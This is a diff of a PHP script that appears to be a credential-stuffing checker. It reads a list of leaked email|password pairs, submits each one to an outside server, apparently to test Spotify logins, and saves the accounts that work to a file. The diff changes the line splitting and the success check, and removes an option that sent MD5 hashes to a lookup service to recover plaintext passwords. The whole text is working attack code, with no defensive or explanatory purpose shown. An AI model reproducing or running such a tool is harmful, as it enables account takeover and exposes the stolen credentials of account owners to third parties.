@@ -8,18 +8,13 @@ function in_string($s,$as) {
 }
 if(empty($argv[1])) exit("List empass mana?");
 $file = file_get_contents($argv[1]);
-$data = explode("\n",$file);
+$data = explode("\r\n",$file);
 for($a=0;$a<count($data);$a++){
         $data1 = explode("|",$data[$a]);
         $email = $data1[0];
         $pass = $data1[1];
-	if($argv[2]=="--md5"){
-		$get = @file_get_contents("https://lea.kz/api/hash/$pass");
-		$json = json_decode($get,true);
-		$pass = $json['password'];
-	}
 	$cek = @file_get_contents("https://www.ezcom-proaudio.my/sass/conn.php?email=$email&pass=$pass");
-	if (strpos($cek,"PREMIUM")) {
+	if (strpos($cek,"Country")) {
                 if(!in_array($cek,explode("\n",@file_get_contents("spotify-b.txt")))){
                         $h=fopen("spotify-b.txt","a");
                         fwrite($h,$cek."\n");
